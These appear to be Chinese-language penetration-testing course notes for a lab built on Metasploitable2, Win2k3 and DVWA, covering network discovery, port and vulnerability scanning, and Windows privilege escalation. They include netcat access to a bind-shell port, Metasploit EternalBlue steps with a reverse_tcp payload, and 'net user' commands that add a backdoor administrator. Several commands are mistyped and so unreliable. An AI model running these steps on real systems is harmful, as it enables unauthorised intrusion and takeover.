# 攻击流程
课程：
https://www.bilibili.com/video/BV1dh411s7vP

### 一。环境准备

```
1.kali (基于debian发行)
	https://www.kali.org
	设计用于安全检测操作系统，内部集成600+安全工具

2.metasploitable2(基于ubuntu操作系统)
	下载地址：https://sourceforge.net/projects/metasploitable/files/Metasploitable2/
	解压后是已安装好后的vmware虚拟机文件
	默认用户与密码：msfadmin	/	msfadmin
	本身设计作为安全工具测试和演示常见漏洞攻击（本镜像一定不要暴露在容易受攻击的网络中）

3.win2k3(windows server系统)
	https://msdn.itellyou.cn
	
4.nessus漏洞扫描器
	https://www.tenable.com
	是目前全世界最多人使用的漏洞扫描器，总共有75000个机构使用。
	需要到官方获取激活码的
	
5.DVWA+phpstudy
	https://dvwa.co.uk
	是一个容易受攻击的web应用程序，基于php+mysql脆弱的web应用程序。
	phpstudy(DVWA运行环境)
	https://www.xp.cn

	reCAPTCHA key 是啥？
	注册地址：https://www.google.com/recaptcha/admin/create
6.漏洞利用
	https://www.metasploit.com

7.增加点攻击面（w2k3）
	关闭防火墙，开启远程桌面，启动iis服务器，添加新组件
```

### 二。信息获取

```
	OSI分层介绍，网络七层模型

1.二层发现
	主要指链路层，一般使用arp协议，利用mac地址作为识别地址。
	效率高，但无法扫描经过的路由主机。
	常用工具:arping，使用方法：arping 192.168.1.1。
	常用工具：netdiscover(可针对特定子网扫描)，netdiscover -r 192.168.1.1/24。
	弥补由于无法多个主机扫描，只能单个扫描问题
	
2.三层发现
	主要指网络层，一般使用ICMP协议。
	可以发现远程主机，经过路由的主机。
	但，经常被防火墙过滤，相对二层发现比较慢。
	常用工具：ping 域名/ip
	常用工具：fping(可针对特定子网扫描)，fping -g 192.168.1.1/24
	常用工具：hping3(发送自定义ICMP包，绕过防火墙),hping3 -c 2 --icmp 192.168.1.1

3.四层发现
	主要指传输层，一般使用tcp,udp探测
	可以探测远程主机，比三层更可靠，但花费时间长
	常用工具：nmap IP地址
	常用工具：hping3 (使用wirshark抓包，发现发送消息没返回可能防火墙拦截了，需要结合二三层主机发现)
		hping3 --udp -c 3 IP地址
	脚本探测：python,shell

4.端口扫描，端口banner信息（服务版本，操作系统信息）
	TCP端口235端口 与 UDP端口235并不冲突？？？
	nmap：
		nmap IP地址
		nmap IP地址 --script banner -p 端口号	//banner信息获取
		nmap -p 端口号 -sV IP地址							//端口服务版本(有些软件无法直接返回的，所以要加-sv获取)
		nmap -O IP地址 												//操作系统版本，直接获取所有nmap -A -v IP地址，要授权）
	Dmitry(端口扫描只是其中一种)：
		dmitry -p IP地址
		dmitry -pb IP地址			//banner信息获取
	netcat： 
		nc -nvz IP地址 20-30
		nc -vn IP地址 端口号			//banner信息获取
```

### 三。漏洞扫描

```
1.漏洞扫描
	nmap（服务漏洞）：
		nmap --script vuln ip地址
	nessus(系统漏洞)：
		$ nc ip地址 1524				//漏洞利用
		$ id
		

2.漏洞利用metasploit
	https://www.metasploit.com
	$ msfconsole

3.web漏洞扫描
	常见web漏洞扫描器（每个扫描器有各自不同的payload进行探测）：
	wasp-zap,AWVS,appscan,Nikto,burpsuite
	实例：sql Injection
```

### 四。服务漏洞

```
1.ftp
2.ssh
3.telnet
......
```

### 五。攻击方式

```
1.暴力破解
	2.命令执行
	3.CSRF
	4.文件包含
	5.文件上传
	6.SQL注入
	7.XSS
```
8.提权（windows）

```
	提升自己在服务器中的权限，获得最大权限，例如：
	windows下普通用户，通过获取Adminitrator权限；
	linux执行编译后的程序，从普通用户提升root权限；

	本地提权，远程提权，系统提权，第三方软件提权

	net user username password /add			//新建用户
	net localgroup administrator username /add 	//用户给组

	在服务器运维一个服务时，最好给予一个普通的运维用户。如果直接用管理员用户，如果存在服务漏洞，会直接影响系统安全
	中国菜刀软件：
	https://baijiahao.baidu.com/s?id=1617660724292151222&wfr=spider&for=pc

8.1.提权基础
		ipconfig /all		//获取ip信息
		netstat -an		//获取当前主机所有端口开放情况及网络连接情况
		net start/stop		//查看系统开启的所有服务
		tasklist /svc		//获取运行进程名称，pid
		taskkill /?		//删除进程命令
8.2.辅助工具介绍
		Windows-Exploit-Suggester
		https://github.com/mmioimm/windows-exploit-suggester
		https://github.com/GDSSecurity/Windows-Exploit-Suggester
		此工具将目标补丁与Microsoft漏洞数据库进行比较，以检测目标上潜在的缺失补丁
		环境：python2.7,安装xlrd模块
		python2 -m pip install xldd	//安装xlrd模块
		
		systeminfo > win10.txt				//系统信息生成文件
		python2 windows-exploit-suggester.py --update	//获取远程微软漏洞数据库	
		python2 windows-exploit-suggester.py --audit -i win10.txt -d 2022-03-27-mssb.xls	//比对
		
		
8.3.在metasploit下直接利用ms17-010的漏洞扫描，利用漏洞
		msf > search ms17-010				//在metasploit查找漏洞项
		msf > use auxiliary/scanner/smb_ms17_010	//选择漏洞
		msf > show options				//显示选项
		msf > set hosts					//设置主机
		msf > run					//执行探测
	利用漏洞
		msf > use exploit/windows/smb/ms17_010_eternalblue
		msf > show options
		msf > set payload windows/x64/neterpreter/reverse_tcp
		msf > set hosts					//设置主机
		msf > exploit					//提权
		metapreter > shell				//获取系统执行终端

8.4.在metasploit下直接利用ms11-046的漏洞（本地提权）
		1.获取执行cmd命令窗口，使用systeminfo查看当前系统补丁信息
		2.利用工具对比出没有打的补丁
		3.把漏洞利用代码exe上传到服务器并运行(然后用net user查看，系统多了一个后门用户)
```

### 钩子技术：

文章：
https://mp.weixin.qq.com/s/Tot3sxanv75ozrY04xcAfg

按照劫持的目标不同，常见的 HOOK 有以下这些类型：
Inline HOOK
IAT HOOK
C++ virtable HOOK
SEH HOOK
IDT HOOK
SSDT HOOK
IRP HOOK
TDI HOOK && NDIS HOOK
Windows Message HOOK